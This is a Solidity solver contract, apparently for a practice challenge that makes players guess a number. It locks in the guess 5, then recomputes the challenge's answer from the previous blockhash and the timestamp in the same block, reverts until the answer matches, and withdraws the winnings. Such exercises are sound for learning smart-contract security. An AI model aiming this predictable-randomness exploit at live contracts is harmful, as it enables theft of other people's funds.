pragma solidity ^0.8.0;

interface Challenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract Solver {

    Challenge public challenge;
    address public owner;

    constructor(address _challengeAddress) {
        challenge = Challenge(_challengeAddress);
        owner = msg.sender;
    }

    function makeBid() public payable {
        require(msg.sender == owner);
        require(msg.value == 1 ether);
        challenge.lockInGuess{value: 1 ether}(5);
    }

    function solve() public payable {
        // Assume it has been locked with number 5
        require(msg.sender == owner, "Only the owner can solve this challenge");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == 5, "wrong");
        challenge.settle();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
